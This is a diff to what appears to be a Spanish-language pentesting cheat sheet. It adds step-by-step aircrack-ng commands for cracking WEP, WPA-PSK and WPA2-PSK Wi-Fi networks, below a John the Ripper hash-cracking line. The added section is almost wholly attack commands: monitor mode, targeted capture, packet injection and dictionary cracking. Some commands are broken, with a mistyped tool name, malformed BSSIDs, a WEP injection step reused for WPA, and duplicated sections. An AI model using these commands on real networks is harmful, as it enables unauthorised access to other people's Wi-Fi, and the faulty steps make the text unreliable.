@@ -71,3 +71,41 @@ Extensión pdf File
     
     2-. Crackear archivo hash con john
     Comando: john hash1 -w ../../wordlists/1000000-password-seclists.txt
+    
+Cracking Password Wifi
+WEP Cracking
+    1-. Poner la tarjeta de red en modo monitor
+    Comando: airmon-ng start wlan0
+    2-. Capturar trafico de redes wifi cercanas
+    Comando: airodump-ng wlan0
+    3-. Capturar de paquetes de una red especifica
+    Comando: airodump-ng --bssid 00:00:00:00:00:00 -c 11 -w WEPCrack wlan0
+    4-. Inyectar clientes a la red para obtener mas rapido los paquetes
+    Comando: aireplay-ng -3 -b 00::00:00:00:00:00 -h 11:11:11:11:11:11 wlan0
+    5-. Cracking de paquetes de red
+    Comando: aircrack.ng WEPCrack.cap
+    
+WPA PSK
+    1-. Poner la tarjeta de red en modo monitor
+    Comando: airmon-ng start wlan0
+    2-. Capturar trafico de redes wifi cercanas
+    Comando: airodump-ng wlan0
+    3-. Capturar de paquetes de una red especifica
+    Comando: airodump-ng --bssid 00:00:00:00:00:00 -c 11 -w WPAPSK wlan0
+    4-. Inyectar clientes a la red para obtener mas rapido los paquetes
+    Comando: aireplay-ng -3 -b 00::00:00:00:00:00 -h 11:11:11:11:11:11 wlan0
+    5-. Cracking de paquetes de red
+    Comando: aircrack-ng -w rockyou.txt -b 00::00:00:00:00:00 WPAPSK.cap
+
+WPA PSK & WPA2 PSK
+    1-. Poner la tarjeta de red en modo monitor
+    Comando: airmon-ng start wlan0
+    2-. Capturar trafico de redes wifi cercanas
+    Comando: airodump-ng wlan0
+    3-. Capturar de paquetes de una red especifica
+    Comando: airodump-ng --bssid 00:00:00:00:00:00 -c 11 -w WPAPSK wlan0
+    4-. Inyectar clientes a la red para obtener mas rapido los paquetes
+    Comando: aireplay-ng -3 -b 00::00:00:00:00:00 -h 11:11:11:11:11:11 wlan0
+    5-. Cracking de paquetes de red
+    Comando: aircrack-ng -w rockyou.txt -b 00::00:00:00:00:00 WPAPSK.cap
+    
